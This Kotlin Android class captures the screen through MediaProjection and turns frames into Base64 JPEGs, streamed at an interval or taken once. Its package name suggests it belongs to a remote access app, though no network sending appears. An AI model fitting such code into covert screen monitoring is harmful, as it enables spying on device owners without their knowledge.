package com.ratio.ratapp

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import kotlin.math.min

class ScreenCap(private val ctx: Context) {

    private var projection: MediaProjection? = null
    private var resultCode: Int = 0
    private var resultData: Intent? = null

    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var handler: Handler? = null

    private var streaming = false
    private var intervalMs = 1500
    private var onFrame: ((String) -> Unit)? = null

    private val mpm get() = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

    fun setProjectionResult(code: Int, data: Intent) {
        resultCode = code; resultData = data
    }

    private fun ensureProjection(): MediaProjection? {
        if (projection != null) return projection
        if (resultData == null) return null
        projection = mpm.getMediaProjection(resultCode, resultData!!)
        projection?.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() { releaseDisplay() }
        }, null)
        return projection
    }

    private fun size(): Triple<Int, Int, Int> {
        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val dm = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(dm)
        val w = min(dm.widthPixels, 720)
        val h = (dm.heightPixels * (w.toFloat() / dm.widthPixels)).toInt()
        return Triple(w, h, dm.densityDpi)
    }

    @SuppressLint("WrongConstant")
    private fun setupDisplay(): Boolean {
        val proj = ensureProjection() ?: return false
        if (virtualDisplay != null) return true
        val (w, h, dpi) = size()
        imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        thread = HandlerThread("scr").also { it.start() }
        handler = Handler(thread!!.looper)
        virtualDisplay = proj.createVirtualDisplay(
            "scr", w, h, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, handler
        )
        return true
    }

    private fun releaseDisplay() {
        try { virtualDisplay?.release() } catch (_: Throwable) {}
        try { imageReader?.close() } catch (_: Throwable) {}
        virtualDisplay = null; imageReader = null
        thread?.quitSafely(); thread = null; handler = null
    }

    @SuppressLint("WrongConstant")
    private fun grabFrame(quality: Int = 35): String? {
        val reader = imageReader ?: return null
        val img: Image = reader.acquireLatestImage() ?: return null
        return try {
            val plane = img.planes[0]
            val rowStride = plane.rowStride
            val pixelStride = plane.pixelStride
            val rowPadding = rowStride - pixelStride * img.width
            val bmpW = img.width + rowPadding / pixelStride
            val bmp = Bitmap.createBitmap(bmpW, img.height, Bitmap.Config.ARGB_8888)
            bmp.copyPixelsFromBuffer(plane.buffer)
            val cropped = Bitmap.createBitmap(bmp, 0, 0, img.width, img.height)
            val out = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, quality, out)
            cropped.recycle(); bmp.recycle()
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (t: Throwable) { null } finally { img.close() }
    }

    fun startStream(intervalMs: Int, onFrame: (String) -> Unit) {
        if (!setupDisplay()) return
        this.intervalMs = intervalMs
        this.onFrame = onFrame
        if (streaming) return
        streaming = true
        val h = Handler(android.os.Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                if (!streaming) return
                val b64 = grabFrame()
                if (b64 != null) onFrame(b64)
                h.postDelayed(this, intervalMs.toLong())
            }
        }
        h.post(runnable)
    }

    fun stop() {
        streaming = false
        onFrame = null
        releaseDisplay()
    }

    fun captureOnce(cb: (String) -> Unit) {
        if (!setupDisplay()) { cb(""); return }
        val h = Handler(android.os.Looper.getMainLooper())
        h.postDelayed({
            val b64 = grabFrame(60) ?: ""
            cb(b64)
        }, 400)
    }
}